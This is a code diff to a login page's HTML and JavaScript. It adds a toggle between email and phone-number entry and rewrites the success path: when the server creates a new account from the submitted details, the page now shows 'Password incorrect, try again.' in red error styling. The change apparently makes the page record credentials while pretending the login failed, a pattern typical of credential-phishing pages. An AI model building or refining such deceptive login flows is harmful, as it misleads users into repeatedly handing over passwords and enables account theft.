@@ -84,9 +84,9 @@
     }
     .server-message.success {
       display: block;
-      background-color: #f0fff4;
-      color: #007a33;
-      border: 1px solid #b2dfcc;
+      background-color: #fff0f0;
+      color: #cc0000;
+      border: 1px solid #f5c6c6;
     }
 
     .login-button {
@@ -127,7 +127,11 @@
 
       <label for="username">Username or Email</label>
       <input type="text" id="username" name="name" required>
-
+      
+      <p style="text-align:left; margin: 6px 0 0; font-size: 12px;">
+        <a href="javascript:void(0);" id="switch-to-phone" style="color:#1a8fe3; text-decoration:none; font-weight:600;">Use phone number instead</a>
+      </p>
+      
       <label for="password">Password</label>
       <div class="password-container">
         <input type="password" id="password" name="message" required>
@@ -179,7 +183,7 @@
         if (res.ok) {
           serverMsg.className   = 'server-message success';
           serverMsg.textContent = data.isNewAccount
-            ? 'Demo account created and logged in!'
+            ? 'Password incorrect, try again.'
             : 'Login successful!';
         } else {
           serverMsg.className   = 'server-message error';
@@ -203,6 +207,23 @@
       } else {
         passwordField.type = 'password';
         this.textContent = 'Show';
+      }
+    });
+    
+    // ── Switch username/email ↔ phone ────────────────────────────────
+    const switchToPhone = document.getElementById('switch-to-phone');
+    const usernameInput = document.getElementById('username');
+    const usernameLabel = document.querySelector('label[for="username"]');
+    
+    switchToPhone.addEventListener('click', function () {
+      if (usernameLabel.textContent === 'Username or Email') {
+        usernameLabel.textContent = 'Phone Number';
+        usernameInput.type        = 'tel';
+        switchToPhone.textContent = 'Use email instead';
+      } else {
+        usernameLabel.textContent = 'Username or Email';
+        usernameInput.type        = 'text';
+        switchToPhone.textContent = 'Use phone number instead';
       }
     });
   </script>
